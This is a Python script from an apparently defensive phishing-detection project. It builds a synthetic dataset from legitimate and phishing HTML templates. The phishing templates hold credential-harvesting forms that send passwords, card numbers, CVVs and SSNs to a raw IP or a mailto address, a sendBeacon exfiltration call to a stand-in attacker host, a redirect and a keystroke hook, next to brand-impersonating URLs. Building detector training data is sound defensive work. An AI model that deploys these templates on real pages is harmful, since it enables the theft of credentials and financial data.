"""
PHISH GUARD - Hybrid AI Browser Security System
Module: dataset.generate_hybrid_dataset

Generates a realistic multi-modal dataset containing both URL features AND
webpage content / DOM / Form / JavaScript metadata for training hybrid AI models.
"""

import csv
import os
import random
import sys

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.append(BASE_DIR)

from feature_extractors.url_feature_extractor import extract_url_features, get_url_feature_names
from content_analyzer.html_content_analyzer import HTMLContentAnalyzer
from form_analyzer.form_security_analyzer import FormSecurityAnalyzer
from javascript_analyzer.js_threat_analyzer import JavaScriptThreatAnalyzer
from image_analyzer.image_asset_analyzer import ImageAssetAnalyzer

OUTPUT_HYBRID_CSV = os.path.join(os.path.dirname(__file__), "hybrid_features_dataset.csv")

# Sample HTML Templates for Synthesis
LEGITIMATE_HTML_TEMPLATES = [
    """<!DOCTYPE html><html><head><title>{title}</title><meta name="description" content="Official Portal"></head><body><header><nav><a href="/home">Home</a><a href="/products">Products</a><a href="/about">About Us</a></nav></header><main><h1>Welcome</h1><p>Explore our secure documentation and cloud services.</p><form action="/search" method="GET"><input type="text" name="q" placeholder="Search..."><button type="submit">Search</button></form><img src="/static/logo.png" alt="Company Logo"></main><footer><a href="/privacy">Privacy Policy</a></footer></body></html>""",
    """<!DOCTYPE html><html><head><title>{title} - Support</title></head><body><h1>Customer Support</h1><p>Documentation and articles.</p><a href="/help/articles">Articles</a><a href="/contact">Contact Us</a><img src="/assets/banner.jpg" alt="Support Banner"></body></html>""",
    """<!DOCTYPE html><html><head><title>{title} Developer Hub</title></head><body><pre><code>curl -X GET https://api.example.com</code></pre><a href="/docs/api">API Reference</a><script src="/js/analytics.js"></script></body></html>"""
]

PHISHING_HTML_TEMPLATES = [
    """<!DOCTYPE html><html oncontextmenu="return false;"><head><title>{title}</title></head><body><div class="alert">CRITICAL ALERT: Your {brand} account has been suspended! Update payment immediately.</div><form action="http://198.51.100.42/harvest.php" method="POST"><input type="text" name="email" placeholder="Email / Username"><input type="password" name="password" placeholder="Password"><input type="text" name="card_number" placeholder="Credit Card Number"><input type="text" name="cvv" placeholder="CVV"><input type="hidden" name="session_token" value="abc12345"><button type="submit">Verify Now</button></form><script>eval(function(p,a,c,k,e,d){{return p;}}('alert("Session Expired");',[],0,{{}}));</script><iframe src="about:blank" style="display:none;width:0;height:0;"></iframe><img src="https://legit-cdn.com/{brand}-logo.png" alt="{brand} Login"></body></html>""",
    """<!DOCTYPE html><html><head><title>Verify {brand} Account Security</title><meta http-equiv="refresh" content="30;url=http://attacker-gate.xyz"></head><body><h1>Security Verification Required</h1><form action="#" method="GET"><input type="password" name="pwd"><input type="text" name="otp_code" placeholder="Enter 6-digit OTP"><button type="submit">Submit Token</button></form><script>document.addEventListener('submit', function(e){{ navigator.sendBeacon('http://exfiltrate-node.xyz/log', document.querySelector('input').value); }});</script><a href="#"></a><a href="#"></a><a href="javascript:void(0)"></a></body></html>""",
    """<!DOCTYPE html><html><head><title>{brand} Banking Portal</title></head><body><div class="scare">Immediate Action Required: Unauthorized login detected from unknown IP.</div><form action="mailto:stealer@hacker-mail.com"><input type="text" name="username"><input type="password" name="password"><input type="text" name="ssn" placeholder="Social Security Number"><button type="submit">Unlock Account</button></form><script>window.addEventListener('keydown', function(e){{ navigator.clipboard.writeText(e.key); }});</script></body></html>"""
]

LEGIT_SITES = [
    ("https://www.google.com/search?q=cybersecurity", "Google Search", "google"),
    ("https://github.com/torvalds/linux", "GitHub - torvalds/linux", "github"),
    ("https://en.wikipedia.org/wiki/Phishing", "Phishing - Wikipedia", "wikipedia"),
    ("https://www.microsoft.com/en-us/security", "Microsoft Security Solutions", "microsoft"),
    ("https://developer.mozilla.org/en-US/docs/Web/HTTP", "HTTP Protocols - MDN", "mozilla"),
    ("https://www.apple.com/iphone-16-pro", "Apple iPhone 16 Pro", "apple"),
    ("https://www.paypal.com/us/home", "PayPal Digital Wallet", "paypal"),
    ("https://www.amazon.com/gp/bestsellers", "Amazon Bestsellers", "amazon"),
    ("https://www.chase.com/personal/banking", "Chase Personal Banking", "chase"),
    ("https://www.netflix.com/browse", "Netflix Streaming", "netflix")
]

PHISH_SITES = [
    ("http://paypal-verification-account-alert.xyz/update-login.php", "PayPal Account Verification", "paypal"),
    ("http://appleid-security-center-support.top/auth/verify", "Apple ID Security Support", "apple"),
    ("http://microsoft-login-protection-live.cfd/signin", "Microsoft Account Sign In", "microsoft"),
    ("http://192.168.1.105/chase-online/login.html", "Chase Online Banking Portal", "chase"),
    ("http://netflix-billing-reactivate-alert.buzz/session", "Netflix Membership Update", "netflix"),
    ("http://binance-wallet-recovery-kyc.rest/auth", "Binance Wallet Recovery", "binance"),
    ("http://google-accounts-security-protection.club/signin", "Google Accounts Login", "google"),
    ("https://bit.ly/3xY9zq", "Verify Identity Token", "paypal"),
    ("http://wellsfargo-locked-resolution.cfd/index.php", "Wells Fargo Account Locked", "wellsfargo"),
    ("http://bankofamerica-confirm-identity.xyz/login.html", "Bank of America Verification", "bankofamerica")
]


def generate_hybrid_samples(total_samples: int = 3000):
    """Synthesizes rich dataset with URL + HTML + Form + JS + Image features."""
    html_analyzer = HTMLContentAnalyzer()
    form_analyzer = FormSecurityAnalyzer()
    js_analyzer = JavaScriptThreatAnalyzer()
    img_analyzer = ImageAssetAnalyzer()

    rows = []
    headers = None

    half = total_samples // 2
    random.seed(42)

    print(f"[*] Generating {half} Legitimate Hybrid samples...")
    for i in range(half):
        url, title, brand = random.choice(LEGIT_SITES)
        rand_id = random.randint(1000, 99999)
        url_variant = f"{url}?ref=nav_{rand_id}" if "?" not in url else f"{url}&token={rand_id}"

        tmpl = random.choice(LEGITIMATE_HTML_TEMPLATES)
        html = tmpl.format(title=title, brand=brand)

        # Extract all sub-features
        u_feats, _, _ = extract_url_features(url_variant)
        c_feats, _, _ = html_analyzer.analyze_html(html, base_url=url_variant)
        f_feats, _, _ = form_analyzer.analyze_forms([{"action": "/search", "method": "GET", "inputs": [{"type": "text", "name": "q"}]}], url_variant)
        j_feats, _, _ = js_analyzer.analyze_scripts("console.log('clean script');")
        i_feats, _, _ = img_analyzer.analyze_images([{"src": "/static/logo.png", "alt": "Logo"}], "/favicon.ico", url_variant)

        combined = {}
        combined.update(u_feats)
        combined.update(c_feats)
        combined.update(f_feats)
        combined.update(j_feats)
        combined.update(i_feats)
        combined["label"] = 0  # Safe

        if headers is None:
            headers = list(combined.keys())
        rows.append(combined)

    print(f"[*] Generating {half} Phishing Hybrid samples...")
    for i in range(half):
        url, title, brand = random.choice(PHISH_SITES)
        rand_id = random.randint(1000, 99999)
        url_variant = f"{url}?session_id={rand_id}"

        tmpl = random.choice(PHISHING_HTML_TEMPLATES)
        html = tmpl.format(title=title, brand=brand)

        u_feats, _, _ = extract_url_features(url_variant)
        c_feats, _, _ = html_analyzer.analyze_html(html, base_url=url_variant)
        f_feats, _, _ = form_analyzer.analyze_forms([
            {"action": "http://198.51.100.42/harvest.php", "method": "POST", "inputs": [
                {"type": "text", "name": "email"},
                {"type": "password", "name": "password"},
                {"type": "text", "name": "card_number"}
            ]}
        ], url_variant)
        j_feats, _, _ = js_analyzer.analyze_scripts("eval(function(p,a,c,k,e,d)...); document.addEventListener('submit', function(e){});")
        i_feats, _, _ = img_analyzer.analyze_images([{"src": f"https://legit-cdn.com/{brand}-logo.png", "alt": f"{brand} logo"}], f"/{brand}.ico", url_variant)

        combined = {}
        combined.update(u_feats)
        combined.update(c_feats)
        combined.update(f_feats)
        combined.update(j_feats)
        combined.update(i_feats)
        combined["label"] = 1  # Phishing

        rows.append(combined)

    random.shuffle(rows)

    os.makedirs(os.path.dirname(OUTPUT_HYBRID_CSV), exist_ok=True)
    with open(OUTPUT_HYBRID_CSV, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=headers)
        writer.writeheader()
        writer.writerows(rows)

    print(f"[+] Hybrid dataset successfully generated: {OUTPUT_HYBRID_CSV}")
    print(f"[+] Total samples: {len(rows)}, Total features per sample: {len(headers) - 1}")
    return OUTPUT_HYBRID_CSV, headers


if __name__ == "__main__":
    generate_hybrid_samples(3000)
